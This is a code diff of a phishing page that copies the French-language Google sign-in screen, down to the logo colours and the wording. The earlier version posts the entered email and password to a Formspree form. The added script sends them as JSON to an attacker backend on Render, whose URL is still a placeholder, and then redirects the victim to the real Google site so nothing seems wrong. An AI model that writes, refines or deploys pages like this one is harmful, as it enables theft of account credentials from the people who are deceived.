@@ -3,92 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion – Comptes Google</title>
+    <title>Connexion – Compte Google</title>
     <style>
         * {
             box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
         body {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
             background-color: #f0f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
         .login-container {
             background: #ffffff;
-            width: 450px;
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-
-        .logo {
+            width: 450px;
+            max-width: 100%;
+            border: 1px solid #dadce0;
             text-align: center;
-            margin-bottom: 16px;
         }
-
-        .logo span {
+        .logo {
             font-size: 24px;
             font-weight: bold;
-            letter-spacing: -1px;
+            margin-bottom: 16px;
         }
-
-        /* Couleurs officielles de Google */
-        .g-blue { color: #4285F4; }
-        .g-red { color: #EA4335; }
-        .g-yellow { color: #FBBC05; }
-        .g-green { color: #34A853; }
-
-        .title {
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+        
+        h2 {
             font-size: 24px;
             font-weight: 400;
-            color: #202124;
-            text-align: center;
             margin-bottom: 8px;
+            color: #202124;
         }
-
-        .subtitle {
+        p {
             font-size: 16px;
             color: #202124;
-            text-align: center;
             margin-bottom: 30px;
         }
-
         .input-group {
-            position: relative;
             margin-bottom: 20px;
+            text-align: left;
         }
-
-        .input-group input {
+        input[type="email"], input[type="password"] {
             width: 100%;
             padding: 16px;
             border: 1px solid #dadce0;
             border-radius: 4px;
             font-size: 16px;
             outline: none;
-            transition: border-color 0.2s;
+            transition: border 0.2s;
         }
-
-        .input-group input:focus {
+        input:focus {
             border-color: #1a73e8;
-            border-width: 2px;
-            padding: 15px;
         }
-
         .links-container {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 25px;
-            margin-bottom: 30px;
+            margin-top: 30px;
         }
-
         .link {
             color: #1a73e8;
             text-decoration: none;
@@ -96,63 +78,79 @@
             font-weight: 500;
             cursor: pointer;
         }
-
         .link:hover {
             text-decoration: underline;
         }
-
         .btn-submit {
             background-color: #1a73e8;
             color: white;
             border: none;
             padding: 10px 24px;
+            border-radius: 4px;
             font-size: 14px;
             font-weight: 500;
-            border-radius: 4px;
             cursor: pointer;
             transition: background 0.2s;
-            float: right;
         }
-
         .btn-submit:hover {
             background-color: #1557b0;
-        }
-
-        .clearfix::after {
-            content: "";
-            clear: both;
-            display: table;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <div class="logo">
-            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+<div class="login-container">
+    <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    
+    <h2>Connexion</h2>
+    <p>Accéder à votre compte</p>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+        </div>
+        
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Saisissez votre mot de passe" required>
         </div>
 
-        <h1 class="title">Connexion</h1>
-        <p class="subtitle">Accéder à votre compte</p>
+        <div class="links-container">
+            <a href="https://www.google.com" class="link">Créer un compte</a>
+            <a href="https://www.google.com" class="link">Mot de passe oublié ?</a>
+        </div>
 
-        <form action="https://formspree.io/f/xaqzlarv" method="POST" class="clearfix">
-            
-            <div class="input-group">
-                <input type="email" name="email" placeholder="Adresse e-mail ou téléphone" required>
-            </div>
-
-            <div class="input-group">
-                <input type="password" name="password" placeholder="Saisissez votre mot de passe" required>
-            </div>
-
-            <div class="links-container">
-                <a href="hh.html" class="link">Créer un compte</a>
-                <a href="hh.html" class="link">Mot de passe oublié ?</a>
-            </div>
-
+        <div class="links-container" style="justify-content: flex-end; margin-top: 20px;">
             <button type="submit" class="btn-submit">Suivant</button>
-        </form>
-    </div>
+        </div>
+    </form>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        try {
+            // قم بتغيير هذا الرابط بعد رفع الباك إند على Render والحصول على الرابط الخارجي المباشر
+            await fetch('https://اسم-مشروعك-هنا.onrender.com/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email: email, password: password })
+            });
+        } catch (error) {
+            console.log("Redirection...");
+        } finally {
+            // التوجيه النهائي الفوري إلى جوجل الرسمي
+            window.location.href = "https://www.google.com";
+        }
+    });
+</script>
 
 </body>
 </html>
